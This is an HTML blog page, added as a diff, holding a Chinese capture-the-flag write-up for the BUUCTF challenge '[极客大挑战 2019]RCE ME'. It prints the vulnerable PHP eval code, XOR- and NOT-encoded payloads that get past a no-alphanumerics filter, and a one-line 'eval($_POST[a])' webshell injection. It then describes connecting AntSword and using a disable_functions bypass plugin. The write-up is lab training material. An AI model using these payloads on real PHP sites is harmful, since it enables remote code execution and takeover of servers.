@@ -1,0 +1,210 @@
+<!doctype html>
+<html lang="zh-cn">
+  <head>
+    <title>2019极客大挑战 // main1o</title>
+    <link rel="shortcut icon" href="ICON.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.152.2">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="John Doe" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.5b1fcc8902588589c4767187402a3c29f8b8d7a6fdef6d9f8f77045bb0d14fee.css" />
+    
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="2019极客大挑战">
+  <meta name="twitter:description" content="[极客大挑战 2019]RCE ME 在线环境BUUCTF搜索
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 &lt;?php error_reporting(0); if(isset($_GET[&#39;code&#39;])){ $code=$_GET[&#39;code&#39;]; if(strlen($code)&gt;40){ die(&#34;This is too Long.&#34;); } if(preg_match(&#34;/[A-Za-z0-9]&#43;/&#34;,$code)){ die(&#34;NO.&#34;); } @eval($code); } else{ highlight_file(__FILE__); } // ?&gt; 分析代码知道传入的值不能是A-Z,a-z,0-9并且不能大于40个字符
+1 2 3 4 ?code=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;%ff=phpinfo // 这里进行异或绕过了 // 被解析为：${_GET}{%ff}();&amp;%ff=phpinfo	再次构建payload
+1 2 3 4 5 6 7 8 9 &lt;?php error_reporting(0); $a=&#39;assert&#39;; $b=urlencode(~$a); echo $b; echo &#34;&lt;br&gt;&#34;; $c=&#39;(eval($_POST[a]))&#39;; $d=urlencode(~$c); echo $d; 1 2 3 4 5 6 7 %9E%8C%8C%9A%8D%8B %D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6 // 传值得取反 code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6); 用web工具连接，蚁剑 在之前的phpinfo能看到很多函数被禁用了，蚁剑不能调用终端，所以得开代理下载一个蚁剑插件，在插件市场里，下载disable_functions的插件 然后在webshell连接页面，启用插件，选择模式 PHP7的UAF">
+
+    <meta property="og:url" content="https://main1o.github.io/p/2019%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/">
+  <meta property="og:site_name" content="main1o">
+  <meta property="og:title" content="2019极客大挑战">
+  <meta property="og:description" content="[极客大挑战 2019]RCE ME 在线环境BUUCTF搜索
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 &lt;?php error_reporting(0); if(isset($_GET[&#39;code&#39;])){ $code=$_GET[&#39;code&#39;]; if(strlen($code)&gt;40){ die(&#34;This is too Long.&#34;); } if(preg_match(&#34;/[A-Za-z0-9]&#43;/&#34;,$code)){ die(&#34;NO.&#34;); } @eval($code); } else{ highlight_file(__FILE__); } // ?&gt; 分析代码知道传入的值不能是A-Z,a-z,0-9并且不能大于40个字符
+1 2 3 4 ?code=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;%ff=phpinfo // 这里进行异或绕过了 // 被解析为：${_GET}{%ff}();&amp;%ff=phpinfo	再次构建payload
+1 2 3 4 5 6 7 8 9 &lt;?php error_reporting(0); $a=&#39;assert&#39;; $b=urlencode(~$a); echo $b; echo &#34;&lt;br&gt;&#34;; $c=&#39;(eval($_POST[a]))&#39;; $d=urlencode(~$c); echo $d; 1 2 3 4 5 6 7 %9E%8C%8C%9A%8D%8B %D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6 // 传值得取反 code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6); 用web工具连接，蚁剑 在之前的phpinfo能看到很多函数被禁用了，蚁剑不能调用终端，所以得开代理下载一个蚁剑插件，在插件市场里，下载disable_functions的插件 然后在webshell连接页面，启用插件，选择模式 PHP7的UAF">
+  <meta property="og:locale" content="zh_cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2021-09-09T00:00:00+00:00">
+    <meta property="article:modified_time" content="2021-09-09T00:00:00+00:00">
+    <meta property="article:tag" content="Php">
+    <meta property="article:tag" content="Ctf">
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="/"><img class="app-header-avatar" src="/avatar.jpg" alt="John Doe" /></a>
+      <span class="app-header-title">main1o</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">About</a>
+      </nav>
+      <p>荆棘之路</p>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">2019极客大挑战</h1>
+      <div class="post-meta">
+        <div>
+          <svg class="icon icon-calendar" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
+          Sep 9, 2021
+        </div>
+        <div>
+          <svg class="icon icon-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>clock</title><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+          1 min read
+        </div>
+        <div>
+          <svg class="icon icon-tag" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>tag</title><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line></svg>
+              <a class="tag" href="/tags/php/">Php</a>
+              <a class="tag" href="/tags/ctf/">Ctf</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="极客大挑战-2019rce-me">[极客大挑战 2019]RCE ME</h1>
+<p>在线环境BUUCTF搜索</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$code</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">40</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">                                        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;This is too Long.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                                                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/[A-Za-z0-9]+/&#34;</span><span class="p">,</span><span class="nv">$code</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">                                        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;NO.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                                                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">                    <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$code</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// ?&gt;
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>分析代码知道传入的值不能是<code>A-Z,a-z,0-9</code>并且不能大于40个字符</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">?</span><span class="nx">code</span><span class="o">=</span><span class="err">$</span><span class="p">{</span><span class="o">%</span><span class="nx">ff</span><span class="o">%</span><span class="nx">ff</span><span class="o">%</span><span class="nx">ff</span><span class="o">%</span><span class="nx">ff</span><span class="o">^%</span><span class="nx">a0</span><span class="o">%</span><span class="nx">b8</span><span class="o">%</span><span class="nx">ba</span><span class="o">%</span><span class="nx">ab</span><span class="p">}{</span><span class="o">%</span><span class="nx">ff</span><span class="p">}();</span><span class="o">&amp;%</span><span class="nx">ff</span><span class="o">=</span><span class="nx">phpinfo</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 这里进行异或绕过了
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 被解析为：${_GET}{%ff}();&amp;%ff=phpinfo	  
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>再次构建payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="s1">&#39;assert&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">=</span><span class="nx">urlencode</span><span class="p">(</span><span class="o">~</span><span class="nv">$a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$b</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c</span><span class="o">=</span><span class="s1">&#39;(eval($_POST[a]))&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$d</span><span class="o">=</span><span class="nx">urlencode</span><span class="p">(</span><span class="o">~</span><span class="nv">$c</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$d</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">%</span><span class="mi">9</span><span class="nx">E</span><span class="o">%</span><span class="mi">8</span><span class="nx">C</span><span class="o">%</span><span class="mi">8</span><span class="nx">C</span><span class="o">%</span><span class="mi">9</span><span class="nx">A</span><span class="o">%</span><span class="mi">8</span><span class="nx">D</span><span class="o">%</span><span class="mi">8</span><span class="nx">B</span>
+</span></span><span class="line"><span class="cl"><span class="o">%</span><span class="nx">D7</span><span class="o">%</span><span class="mi">9</span><span class="nx">A</span><span class="o">%</span><span class="mi">89</span><span class="o">%</span><span class="mi">9</span><span class="nx">E</span><span class="o">%</span><span class="mi">93</span><span class="o">%</span><span class="nx">D7</span><span class="o">%</span><span class="nx">DB</span><span class="o">%</span><span class="nx">A0</span><span class="o">%</span><span class="nx">AF</span><span class="o">%</span><span class="nx">B0</span><span class="o">%</span><span class="nx">AC</span><span class="o">%</span><span class="nx">AB</span><span class="o">%</span><span class="nx">A4</span><span class="o">%</span><span class="mi">9</span><span class="nx">E</span><span class="o">%</span><span class="nx">A2</span><span class="o">%</span><span class="nx">D6</span><span class="o">%</span><span class="nx">D6</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="c1">// 传值得取反
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">code</span><span class="o">=</span><span class="p">(</span><span class="o">~%</span><span class="mi">9</span><span class="nx">E</span><span class="o">%</span><span class="mi">8</span><span class="nx">C</span><span class="o">%</span><span class="mi">8</span><span class="nx">C</span><span class="o">%</span><span class="mi">9</span><span class="nx">A</span><span class="o">%</span><span class="mi">8</span><span class="nx">D</span><span class="o">%</span><span class="mi">8</span><span class="nx">B</span><span class="p">)(</span><span class="o">~%</span><span class="nx">D7</span><span class="o">%</span><span class="mi">9</span><span class="nx">A</span><span class="o">%</span><span class="mi">89</span><span class="o">%</span><span class="mi">9</span><span class="nx">E</span><span class="o">%</span><span class="mi">93</span><span class="o">%</span><span class="nx">D7</span><span class="o">%</span><span class="nx">DB</span><span class="o">%</span><span class="nx">A0</span><span class="o">%</span><span class="nx">AF</span><span class="o">%</span><span class="nx">B0</span><span class="o">%</span><span class="nx">AC</span><span class="o">%</span><span class="nx">AB</span><span class="o">%</span><span class="nx">A4</span><span class="o">%</span><span class="mi">9</span><span class="nx">E</span><span class="o">%</span><span class="nx">A2</span><span class="o">%</span><span class="nx">D6</span><span class="o">%</span><span class="nx">D6</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">用web工具连接，蚁剑</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在之前的phpinfo能看到很多函数被禁用了，蚁剑不能调用终端，所以得开代理下载一个蚁剑插件，在插件市场里，下载<code>disable_functions的插件</code>
+然后在<code>webshell</code>连接页面，启用插件，选择模式 <code>PHP7的UAF</code></p>
+<p>在根目录看见readflag，运行的得到flag～</p>
+
+    </div>
+    <div class="post-footer">
+      <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
